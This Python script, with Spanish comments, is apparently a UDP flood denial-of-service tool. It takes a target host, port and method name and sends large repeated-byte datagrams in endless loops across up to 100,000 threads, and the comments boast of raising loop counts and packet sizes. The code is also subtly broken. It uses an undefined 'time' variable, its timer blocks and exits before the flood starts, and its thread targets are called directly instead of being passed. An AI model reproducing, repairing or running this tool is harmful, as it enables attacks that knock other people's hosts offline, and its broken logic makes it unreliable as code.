import socket
import threading
import sys
import time as clock

host = str(sys.argv[1])
port = int(sys.argv[2])
#time = int(sys.argv[4])
method = str(sys.argv[3])

loops = 100000  # aumentamos el número de loops

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

def timer(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)

def attack_HQ():
    timeout = clock.time() + time
    timer(timeout)
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(1000), daemon=True).start()  # aumentamos el tamaño de los paquetes
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(2000), daemon=True).start()  # aumentamos el tamaño de los paquetes
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(1000), daemon=True).start()  # aumentamos el tamaño de los paquetes
            threading.Thread(target=send_packet(2000), daemon=True).start()  # aumentamos el tamaño de los paquetes


attack_HQ()
